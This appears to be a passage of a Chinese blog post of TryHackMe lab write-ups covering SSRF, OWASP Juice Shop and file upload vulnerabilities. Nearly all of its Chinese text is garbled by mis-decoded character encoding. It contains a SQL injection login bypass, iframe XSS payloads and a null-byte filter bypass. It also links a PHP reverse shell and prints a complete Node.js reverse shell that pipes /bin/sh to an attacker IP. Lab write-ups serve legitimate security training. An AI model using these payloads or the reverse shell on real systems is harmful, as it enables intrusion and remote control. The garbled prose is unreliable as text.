æ­¤è¯·åŠ¡å¿…ç¡®ä¿å®ƒä»¬å®‰å…¨å­˜å‚¨ï¼Œå¹¶ä¸”è¿™äº›æ—¥å¿—çš„å¤šä¸ªå‰¯æœ¬å­˜å‚¨åœ¨ä¸åŒçš„ä½ç½®ã€‚</p><p>æ‚¨å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼Œåœ¨å‘ç”Ÿè¿è§„æˆ–äº‹ä»¶åï¼Œæ—¥å¿—è®°å½•æ›´ä¸ºé‡è¦ã€‚ç†æƒ³çš„æƒ…å†µæ˜¯è¿›è¡Œç›‘æ§ä»¥æ£€æµ‹ä»»ä½•å¯ç–‘æ´»åŠ¨ã€‚æ£€æµ‹æ­¤å¯ç–‘æ´»åŠ¨çš„ç›®çš„æ˜¯å®Œå…¨é˜»æ­¢æ”»å‡»è€…ï¼Œæˆ–è€…åœ¨æ£€æµ‹åˆ°æ”»å‡»è€…çš„å­˜åœ¨æ¯”é¢„æœŸæ™šå¾—å¤šæ—¶å‡å°‘æ”»å‡»è€…é€ æˆçš„å½±å“ã€‚å¯ç–‘æ´»åŠ¨çš„å¸¸è§ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>å¤šæ¬¡æœªç»æˆæƒå°è¯•æ‰§è¡Œç‰¹å®šæ“ä½œï¼ˆé€šå¸¸æ˜¯èº«ä»½éªŒè¯å°è¯•æˆ–è®¿é—®æœªç»æˆæƒçš„èµ„æºï¼Œä¾‹å¦‚ç®¡ç†é¡µé¢ï¼‰</li><li>æ¥è‡ªå¼‚å¸¸ IP åœ°å€æˆ–ä½ç½®çš„è¯·æ±‚ï¼šè™½ç„¶è¿™å¯èƒ½è¡¨æ˜å…¶ä»–äººæ­£åœ¨å°è¯•è®¿é—®ç‰¹å®šç”¨æˆ·çš„å¸æˆ·ï¼Œä½†å®ƒä¹Ÿå¯èƒ½å…·æœ‰è¯¯æŠ¥ç‡ã€‚</li><li>ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·ï¼šç‰¹å®šçš„è‡ªåŠ¨åŒ–å·¥å…·å¯ä»¥å¾ˆå®¹æ˜“åœ°è¯†åˆ«ï¼Œä¾‹å¦‚ä½¿ç”¨User-Agentæ ‡å¤´çš„å€¼æˆ–è¯·æ±‚çš„é€Ÿåº¦ã€‚è¿™å¯èƒ½è¡¨æ˜æ”»å‡»è€…æ­£åœ¨ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·ã€‚</li><li>å¸¸è§æœ‰æ•ˆè´Ÿè½½ï¼šåœ¨ Web åº”ç”¨ç¨‹åºä¸­ï¼Œæ”»å‡»è€…é€šå¸¸ä½¿ç”¨å·²çŸ¥æœ‰æ•ˆè´Ÿè½½ã€‚æ£€æµ‹è¿™äº›æœ‰æ•ˆè´Ÿè½½çš„ä½¿ç”¨å¯èƒ½è¡¨æ˜å­˜åœ¨å¯¹åº”ç”¨ç¨‹åºè¿›è¡Œæœªç»æˆæƒ/æ¶æ„æµ‹è¯•çš„äººã€‚</li></ul><p>ä»…ä»…æ£€æµ‹å¯ç–‘æ´»åŠ¨æ˜¯æ²¡æœ‰å¸®åŠ©çš„ã€‚éœ€è¦æ ¹æ®å½±å“çº§åˆ«å¯¹è¿™ç§å¯ç–‘æ´»åŠ¨è¿›è¡Œè¯„çº§ã€‚ä¾‹å¦‚ï¼ŒæŸäº›æ“ä½œå°†æ¯”å…¶ä»–æ“ä½œäº§ç”Ÿæ›´å¤§çš„å½±å“ã€‚è¿™äº›å½±å“æ›´å¤§çš„è¡ŒåŠ¨éœ€è¦å°½å¿«å¾—åˆ°å›åº”;å› æ­¤ï¼Œä»–ä»¬åº”è¯¥å‘å‡ºè­¦æŠ¥ï¼Œä»¥å¼•èµ·æœ‰å…³å„æ–¹çš„æ³¨æ„ã€‚</p><p>å®ä¾‹:</p><p>åˆ†ææ—¥å¿—å¯ä»¥çŸ¥é“</p><p>49.99.13.16æ˜¯æ”»å‡»ipï¼Œç„¶åä½¿ç”¨çš„æ”»å‡»æ˜¯æš´åŠ›ç ´è§£(Brute Force)</p><ol start="10"><li>Server-Side Request Forgery (SSRF)</li></ol><p>ssrf æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼Œå½“æ”»å‡»è€…å¯ä»¥å¼ºåˆ¶ Web åº”ç”¨ç¨‹åºä»£è¡¨ä»–ä»¬å‘ä»»æ„ç›®æ ‡å‘é€è¯·æ±‚ï¼ŒåŒæ—¶æ§åˆ¶è¯·æ±‚æœ¬èº«çš„å†…å®¹æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæ­¤ç±»æ¼æ´ã€‚SSRF æ¼æ´é€šå¸¸æ¥è‡ªæˆ‘ä»¬çš„ Web åº”ç”¨ç¨‹åºéœ€è¦ä½¿ç”¨ç¬¬ä¸‰æ–¹æœåŠ¡çš„å®ç°ã€‚</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/271d0075650cdf6499f994f99fa7eb8a.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/271d0075650cdf6499f994f99fa7eb8a.png"></p><p>ssrfçš„å±å®³:</p><p>1.æ¢æµ‹å†…ç½‘ï¼Œæ¢æµ‹é‚£äº›æˆ‘ä»¬ä¸èƒ½è®¿é—®çš„å†…å®¹</p><p>2.ä¸ä¸€äº›éhttpæœåŠ¡äº¤äº’ä»¥è·å–è¿œç¨‹ä»£ç æ‰§è¡Œ</p><p>å®ä¾‹:</p><p>é¦–å…ˆè¿›å…¥ç•Œé¢ï¼Œè§‚å¯Ÿä¸€æ³¢ ç‚¹å‡»adminï¼Œå‘ç°åªæœ‰æœ¬æœºåœ°å€(localhost)æ‰èƒ½è®¿é—®ï¼Œæœ‰ä¸€ä¸ªä¸‹è½½æ–‡ä»¶çš„ç‚¹å¾ˆå¯ç–‘ï¼Œè®¿é—®çœ‹ä¸€ä¸‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142200295.png" alt="image-20240314220006071"></p><p>å°±æ˜¯è¿™é‡Œï¼Œserveræˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œå¯ä»¥ä¿®æ”¹æˆæˆ‘ä»¬ç›‘å¬çš„ipåœ°å€åŠ ç«¯å£</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142203248.png" alt="image-20240314220315967"></p><p>ç„¶åæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨è¿™ä¸ªå»è®¿é—®localhost/adminçš„ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142210976.png" alt="image-20240314221015887"></p><p>ç„¶åä¼šæŠŠadminä¸‹çš„æ–‡ä»¶ç»™ä¸‹è½½ä¸‹æ¥ï¼ŒæŸ¥çœ‹å³å¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142210638.png" alt="image-20240314221054350"></p><h3 id="OWASP-Juice-Shop"><a href="#OWASP-Juice-Shop" class="headerlink" title="OWASP Juice Shop"></a>OWASP Juice Shop</h3><p>Inject the juice</p><p>ç™»å½•ç®¡ç†å‘˜ç”¨æˆ· ä¸‡èƒ½å¯†ç è¿›è¡Œç™»å½• åœ¨é‚®ç®±é‚£é‡Œ â€˜or 1=1 â€“ ç„¶åå¯†ç éšä¾¿å¡« </p><p>ç„¶åå¦‚æœæ˜¯benderç”¨æˆ·ç™»å½•çš„è¯ï¼Œæ€è·¯ä¹Ÿæ˜¯ä¸€æ ·çš„</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403152101665.png" alt="image-20240315210145357"></p><p>Who broke my lock?!</p><p>ä¸Šé¢çš„æ˜¯è§£å†³ç™»å½•é—®é¢˜ï¼Œç°åœ¨è¿™ä¸ªä¸»è¦æ˜¯è§£å†³å¯†ç çš„é—®é¢˜ï¼Œæˆ‘ä»¬åœ¨ä¸Šé¢å·²ç»å¯ä»¥ç™»å½•ç®¡ç†å‘˜çš„è´¦å·äº†ï¼Œä½†æ˜¯å¯†ç æˆ‘ä»¬å¹¶ä¸çŸ¥é“ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å°è¯•è¿›è¡Œå¯†ç çš„çˆ†ç ´ã€‚</p><p>å®ä¾‹:</p><p>1.è·å–ç®¡ç†å‘˜çš„å¯†ç ï¼Œå¯¹å¯†ç è¿›è¡Œçˆ†ç ´</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403170016479.png" alt="image-20240317001650078"></p><p>2.é‡ç½®ç”¨æˆ·çš„å¯†ç :</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403181933452.png" alt="image-20240318193331214"></p><p>ä¸»è¦æ˜¯æ ¹æ®åå­—å’Œå–œå¥½è¿›è¡Œçš„ä¸€ä¸ªçŒœæµ‹ï¼Œæ‰€ä»¥ä»¥åè®¾ç½®é—®é¢˜çš„æ—¶å€™è¿˜æ˜¯ä¸¥è°¨ä¸€ç‚¹ã€‚</p><p>æ ¹æ®å‰é¢çš„æ˜Ÿé™…ç©¿è¶Šå’Œåå­—è¿›è¡Œä¸€ä¸ªæœç´¢ï¼Œåœ¨googleä¸­å¯ä»¥æŸ¥åˆ°ç›¸å…³ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403181939380.png" alt="image-20240318193942179"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403181940791.png" alt="image-20240318194003630"></p><p>çŸ¥é“äº†ä¿¡æ¯å°±å¯ä»¥è¿›è¡Œé‡ç½®å¯†ç äº†ã€‚</p><p> AH! Donâ€™t look!</p><p>ä¿¡æ¯æ³„éœ²ã€‚</p><p>å®ä¾‹:</p><p>åœ¨å…³äºæˆ‘ä»¬é‚£é‡Œï¼Œæœ‰ä¸€ä¸ªç»¿è‰²çš„é“¾æ¥ï¼Œæ˜¯ä¸€ä¸ªä¸‹è½½mdæ–‡ä»¶çš„é“¾æ¥<img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182045122.png" alt="image-20240318204508963"></p><p>ç„¶åæˆ‘ä»¬è®¿é—®ftpç›®å½•ï¼Œçœ‹æ˜¯å¦å­˜åœ¨æ•æ„Ÿä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182046562.png" alt="image-20240318204602306"></p><p>çœ‹èµ·æ¥æ˜¯å­˜åœ¨çš„ï¼Œå¯ä»¥ä¸‹è½½ä¸‹æ¥çœ‹çœ‹é‡Œé¢éƒ½æ˜¯ä»€ä¹ˆã€‚</p><p>ä½†æ˜¯å½“æˆ‘ä»¬ä¸‹è½½émdå’Œpdfçš„æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå‡ºç°403ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨%00è¿›è¡Œç»•è¿‡ã€‚</p><p>%00æ˜¯ä¸€ä¸ªNULLç»ˆæ­¢ç¬¦ï¼Œå‘Šè¯‰æœåŠ¡å™¨åœ¨è¿™ä¸ªåœ°æ–¹è¿›è¡Œåœæ­¢ï¼Œç„¶ååé¢çš„å€¼å°±æ˜¯ç©ºçš„ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182142082.png" alt="image-20240318214233803"></p><p>Whoâ€™s flying this thing?</p><p>ä¸»è¦æ˜¯è¶Šæƒï¼Œåˆ†ä¸ºæ°´å¹³è¶Šæƒ(å½“ç”¨æˆ·å¯ä»¥æ‰§è¡Œå…·æœ‰<strong>ç›¸åŒ</strong>æƒé™çº§åˆ«çš„å…¶ä»–ç”¨æˆ·çš„æ“ä½œæˆ–è®¿é—®æ•°æ®æ—¶å‘ç”Ÿã€‚)è¿˜æœ‰ä¸€ä¸ªæ˜¯å‚ç›´è¶Šæƒ(å½“ç”¨æˆ·å¯ä»¥æ‰§è¡Œå…·æœ‰<strong>æ›´é«˜</strong>æƒé™çº§åˆ«çš„å…¶ä»–ç”¨æˆ·çš„æ“ä½œæˆ–è®¿é—®æ•°æ®æ—¶å‘ç”Ÿã€‚)</p><p><img src="https://i.imgur.com/bJ9WKY4.png" alt="img"></p><p>å®ä¾‹:</p><p>æˆ‘ä»¬åœ¨å‰ç«¯é‡Œé¢å‘ç°ä¸€ä¸ªadministration,ç„¶åå°è¯•å»è®¿é—®å‘ç°å¹¶ä¸å¾—è¡Œï¼Œç„¶åæˆ‘ä»¬å»ç™»å½•ç®¡ç†å‘˜ç”¨æˆ·ï¼Œå†å»è®¿é—®è¿™ä¸ªè·¯å¾„å°±å¯ä»¥äº†ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182201934.png" alt="image-20240318220157631"></p><p>Where did that come from?</p><p>ä¸»è¦æ˜¯å…³äºxssçš„ç›¸å…³å†…å®¹ã€‚</p><p>xssåˆ†ä¸ºä¸‰ç±»ï¼Œåˆ†åˆ«æ˜¯DOMå‹xss,åå°„å‹xssï¼Œå­˜å‚¨å‹xss.</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201808117.png" alt="image-20240320180845973"></p><p>å®ä¾‹:</p><p>DOMå‹çš„xss</p><p>åœ¨æœç´¢æ¡†é‚£é‡Œå¯ä»¥è¿›è¡ŒDOMå‹çš„xss </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201815266.png" alt="image-20240320181546019"></p><p>å­˜å‚¨å‹xss</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201849455.png" alt="image-20240320184941297"></p><p>åå°„å‹xss:</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201859281.png" alt="image-20240320185942012"></p><p>æ³¨æ„ä¸€ä¸‹è¿™é‡ŒåŒ…è£¹xssçš„æ˜¯``</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;iframe src=<span class="hljs-string">&quot;javascript:alert(`xss`)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="Upload-Vulnerabilities"><a href="#Upload-Vulnerabilities" class="headerlink" title="Upload Vulnerabilities"></a>Upload Vulnerabilities</h3><p>é¦–å…ˆåšä¸€äº›å‰ç½®å·¥ä½œï¼Œåœ¨/etc/hosts ä¸‹æ·»åŠ ä¸€äº›ä¿¡æ¯ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ip    overwrite<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> shell<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> java<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> annex<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> magic<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> jewel<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> demo<span class="hljs-selector-class">.uploadvulns</span>.thm<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæˆ¿é—´ä¸»è¦æ˜¯ä»‹ç»ä¸€äº›æ–‡ä»¶ä¸Šä¼ çš„åˆ©ç”¨ç‚¹ã€‚</p><p>Overwriting Existing Files(è¦†ç›–æ–‡ä»¶)</p><p>å½“æˆ‘ä»¬æˆåŠŸä¸Šä¼ ä¸Šå»ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œå…¶æ–‡ä»¶åä¼šè¢«æ›´æ”¹,ä»¥é˜²æ­¢æ–‡ä»¶è¦†ç›–ã€‚æ–‡ä»¶åæœ‰æ—¶å¯èƒ½æ˜¯éšæœºçš„ï¼Œæˆ–è€…æ˜¯å½“å‰ä¸Šä¼ çš„æ—¶é—´å’Œæ—¥æœŸæ·»åŠ åˆ°æ–‡ä»¶æœ«å°¾ï¼Œæˆ–è€…æ˜¯å½“ä¸Šä¼ ä¸€ä¸ªç›¸åŒæ–‡ä»¶åæ—¶ï¼Œç›´æ¥è¿”å›é”™è¯¯ã€‚</p><p>å®ä¾‹:</p><p>æˆ‘ä»¬æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼ŒçŸ¥é“å›¾ç‰‡åå­—æ˜¯mountains.jpgï¼Œç„¶åæˆ‘ä»¬å†å»ä¸Šä¼ ä¸€ä¸ªåŒåå­—çš„å›¾ç‰‡ï¼Œå°±ä¼šé€ æˆä¸€ä¸ªæ–‡ä»¶è¦†ç›–ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403212013267.png" alt="image-20240321201326902"></p><p>Remote Code Execution(è¿œç¨‹ä»£ç æ‰§è¡Œ)</p><p>å°±æ˜¯å¾€æœåŠ¡ç«¯ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬,æˆ–è€…æ˜¯åå¼¹shellçš„å‘½ä»¤.</p><p>å®ä¾‹:</p><p>é¦–å…ˆé€šè¿‡dirsearchæ‰«ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šä¼ è·¯å¾„ã€‚</p><p>ç„¶åä¸Šä¼ è¿›å»ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬å°±è¡Œäº†ã€‚</p><p>Filtering</p><p>ä¸Šé¢éƒ½æ˜¯æ²¡è¿‡æ»¤çš„ï¼Œä¸‹é¢è¿™ä¸ªè®²çš„æ˜¯ä¸€äº›è¿‡æ»¤æ–¹æ³•ã€‚</p><p>å¤§ä½“çš„åˆ†ä¸ºä¸¤å¤§ç±»:</p><p>1.å®¢æˆ·ç«¯çš„ä¸€ä¸ªè¿‡æ»¤ï¼Œè¿™é‡Œçš„è¯æ˜¯åœ¨ç”¨æˆ·æµè§ˆå™¨çš„ä¸€ä¸ªè¿‡æ»¤ï¼Œç›¸å¯¹æ¥è¯´æ˜¯å¾ˆå¥½ç»•è¿‡çš„ï¼Œç¦ç”¨jså³å¯ã€‚</p><p>2.å¦å¤–ä¸€ä¸ªæ˜¯åœ¨æœåŠ¡ç«¯çš„ä¸€ä¸ªè¿‡æ»¤ï¼Œè¿™é‡Œçš„ç»•è¿‡å°±éœ€è¦è€ƒè™‘å¾ˆå¤šäº†ï¼Œæˆ‘ä»¬æ˜¯ä¸çŸ¥é“æœåŠ¡ç«¯æ‰€æ‰§è¡Œçš„ä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡Œä¸æ–­çš„å°è¯•ç»•è¿‡ã€‚</p><p>ä¸‹é¢æ¥å…·ä½“ä»‹ç»ä¸€ä¸‹è¿‡æ»¤çš„æ–¹æ³•:</p><p>1.è®¾ç½®ç™½åå•(å³åªå…è®¸æˆ‘ä»¬å®šä¹‰çš„æ–‡ä»¶ä¸Šä¼ )å’Œé»‘åå•(ä¸å…è®¸æˆ‘ä»¬å®šä¹‰çš„æ–‡ä»¶ä¸Šä¼ )ã€‚MS Windows ä»ç„¶ä½¿ç”¨å®ƒä»¬æ¥è¯†åˆ«æ–‡ä»¶ç±»å‹</p><p>2.æ–‡ä»¶ç±»å‹ç­›é€‰ã€‚æ£€æŸ¥MIMEçš„å€¼æ˜¯å¦ç¬¦åˆå›¾ç‰‡ç±»å‹çš„ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403212106148.png" alt="image-20240321210633022"></p><p>è¿˜æœ‰å°±æ˜¯ä¸åŒçš„å›¾ç‰‡ï¼Œå‰å…«ä¸ªå­—èŠ‚æ˜¯å›ºå®šçš„ï¼Œé€šå¸¸uinxé€šè¿‡è¿™ä¸ªæ¥æ£€æŸ¥æ–‡ä»¶æ˜¯å¦ç¬¦åˆæ¡ä»¶ã€‚</p><p>ä¾‹å¦‚:pngå›¾ç‰‡çš„å‰å…«ä¸ªå­—èŠ‚æ˜¯ 89 50 4E 47 0D 0A 1A 0A</p><p>3.æ–‡ä»¶å¤§å°é™åˆ¶ï¼Œå°±æ˜¯é™åˆ¶ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œé˜²æ­¢ä¸Šä¼ å¤§çš„æ–‡ä»¶é€ æˆæœåŠ¡å™¨èµ„æºåŒ®ä¹ã€‚</p><p>4.å¯¹æ–‡ä»¶åçš„è¿‡æ»¤ï¼Œæ£€æŸ¥æ–‡ä»¶åæ˜¯å¦é‡å¤ä»¥åŠæ˜¯å¦å­˜åœ¨ä¸€äº›ä¸åˆæ³•çš„å­—ç¬¦ã€‚</p><p>5.æ–‡ä»¶å†…å®¹çš„è¿‡æ»¤ã€‚</p><p>åå‘shellæ–‡ä»¶:<a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</a></p><p>å®ä¾‹:</p><p>è¿™ä¸ªå®ä¾‹thmç»™äº†å››ç§ï¼Œæˆ‘åªçŸ¥é“å…¶ä¸­çš„ä¸‰ç§ï¼Œæœ€åä¸€ç§æŒºæœ‰æ„æ€çš„ã€‚</p><ol><li><em>åœ¨æµè§ˆå™¨ä¸­å…³é—­ Javascript</em> - å¦‚æœç½‘ç«™ä¸éœ€è¦ Javascript æ¥æä¾›åŸºæœ¬åŠŸèƒ½ï¼Œè¿™å°†èµ·ä½œç”¨ã€‚å¦‚æœå®Œå…¨å…³é—­ Javascript ä¼šé˜»æ­¢ç½‘ç«™è¿è¡Œï¼Œé‚£ä¹ˆå…¶ä»–æ–¹æ³•ä¹‹ä¸€ä¼šæ›´å¯å–;å¦åˆ™ï¼Œè¿™å¯èƒ½æ˜¯å®Œå…¨ç»•è¿‡å®¢æˆ·ç«¯ç­›é€‰å™¨çš„æœ‰æ•ˆæ–¹æ³•ã€‚</li><li><em>æ‹¦æˆªå¹¶ä¿®æ”¹ä¼ å…¥é¡µé¢ã€‚</em> ä½¿ç”¨ Burpsuiteï¼Œæˆ‘ä»¬å¯ä»¥æ‹¦æˆªä¼ å…¥çš„ç½‘é¡µå¹¶åœ¨ Javascript è¿‡æ»¤å™¨æœ‰æœºä¼šè¿è¡Œä¹‹å‰å°†å…¶å‰¥ç¦»ã€‚</li><li><em>æ‹¦æˆªå¹¶ä¿®æ”¹æ–‡ä»¶ä¸Šä¼ ã€‚</em>å¦‚æœå‰é¢çš„æ–¹æ³•åœ¨åŠ è½½ç½‘é¡µ<em>ä¹‹å‰</em>èµ·ä½œç”¨ï¼Œåˆ™æ­¤æ–¹æ³•å…è®¸ç½‘é¡µæ­£å¸¸åŠ è½½ï¼Œä½†åœ¨æ–‡ä»¶å·²é€šè¿‡ï¼ˆå¹¶è¢«ç­›é€‰å™¨æ¥å—ï¼‰åæ‹¦æˆªæ–‡ä»¶ä¸Šä¼ ã€‚åŒæ ·ï¼Œæˆ‘ä»¬å°†ä»‹ç»åœ¨ä»»åŠ¡è¿‡ç¨‹ä¸­ä½¿ç”¨æ­¤æ–¹æ³•çš„è¿‡ç¨‹ã€‚</li><li><em>å°†æ–‡ä»¶ç›´æ¥å‘é€åˆ°ä¸Šä¼ ç‚¹ã€‚</em>ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å¸¦æœ‰è¿‡æ»¤å™¨çš„ç½‘é¡µï¼Œå½“æ‚¨å¯ä»¥ä½¿ç”¨è¯¸å¦‚ ï¼Ÿå°†æ•°æ®ç›´æ¥å‘å¸ƒåˆ°åŒ…å«ç”¨äºå¤„ç†æ–‡ä»¶ä¸Šä¼ çš„ä»£ç çš„é¡µé¢æ˜¯å®Œå…¨ç»•è¿‡å®¢æˆ·ç«¯ç­›é€‰å™¨çš„å¦ä¸€ç§æœ‰æ•ˆæ–¹æ³•ã€‚</li></ol><p>åˆ©ç”¨curlè¯­å¥è¿›è¡Œä¸Šä¼ ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;submit:&lt;value&gt;&quot;</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;&lt;file-parameter&gt;:@&lt;path-to-file&gt;&quot;</span> &lt;site&gt;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç»™çš„å¾ˆæ¸…æ¥šäº†ï¼Œå°±ä¸åšæ¼”ç¤ºäº†ã€‚</p><p> Bypassing Server-Side Filtering: File Extensions</p><p>ä»è¿™é‡Œå¼€å§‹å°±æ˜¯ç»•è¿‡æœåŠ¡ç«¯çš„äº†ã€‚</p><p>ç»•è¿‡çš„æ–¹å¼æ¯”è¾ƒæ‚ä¸€ç‚¹ï¼Œé»‘åå•çš„è¯å°±æ˜¯ä¸æ–­çš„è¿›è¡Œå°è¯•ï¼Œç›´åˆ°æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸Šå»æˆ‘ä»¬æ„é€ çš„shellæ–‡ä»¶ã€‚</p><p>å®ä¾‹:</p><p>è¿™é‡Œthmç»™çš„ä¸Šä¼ ç¯å¢ƒè¿˜æŒºæœ‰æ„æ€çš„ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403261957924.png" alt="image-20240326195715756"></p><p>select æ˜¯é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶</p><p>uploadæ˜¯è¿›è¡Œä¸Šä¼ </p><p>chosen è¾“å‡ºæ‰€é€‰æ–‡ä»¶çš„åç§°</p><p>ä¸Šä¼ php5çš„åç¼€å¯ä»¥ä¸Šä¼ æˆåŠŸ ç„¶ååˆ©ç”¨dirsearchå¯ä»¥æŠŠæ–‡ä»¶å­˜æ”¾çš„è·¯å¾„ç»™çˆ†ç ´å‡ºæ¥ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262022433.png" alt="image-20240326202219319"></p><p>Bypassing Server-Side Filtering: Magic Numbers</p><p>è¿™ä¸ªçš„è¯å°±æ˜¯å¯¹æ–‡ä»¶å¤´çš„ä¸€ä¸ªæ£€æŸ¥ åŠ ä¸€ä¸ªGIF89aå³å¯ç»•è¿‡ã€‚</p><p>æŒ‘æˆ˜:</p><p>é¦–å…ˆæˆ‘ä»¬è¿›å»ä¹‹åå‘ç°æ˜¯ä¸€ä¸ªnodejsçš„æœåŠ¡ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±ä¸èƒ½ç”¨phpäº†ï¼Œå¯ä»¥å»ç½‘ä¸Šæ‰¾ä¸€ä¸ªåå¼¹shellçš„è„šæœ¬ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;net&quot;</span>),<br>    cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>),<br>    sh = cp.<span class="hljs-title function_">spawn</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>, []);<br>    <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.<span class="hljs-title class_">Socket</span>();<br>    client.<span class="hljs-title function_">connect</span>(port, <span class="hljs-string">&quot;æ­¤å¤„æ›¿æ¢ä¸ºæ”»å‡»ç«¯IP&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        client.<span class="hljs-title function_">pipe</span>(sh.<span class="hljs-property">stdin</span>);<br>        sh.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">pipe</span>(client);<br>        sh.<span class="hljs-property">stderr</span>.<span class="hljs-title function_">pipe</span>(client);<br>    &#125;);<br>    <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span>;<br>&#125;)();<br></code></pre></td></tr></table></figure><p>é€šè¿‡æ‰«æåå°å¯ä»¥å¾—åˆ°ä¸€äº›è·¯å¾„</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262105826.png" alt="image-20240326210524742"></p><p>é€šè¿‡æŸ¥çœ‹ç½‘é¡µæºä»£ç :</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262106029.png" 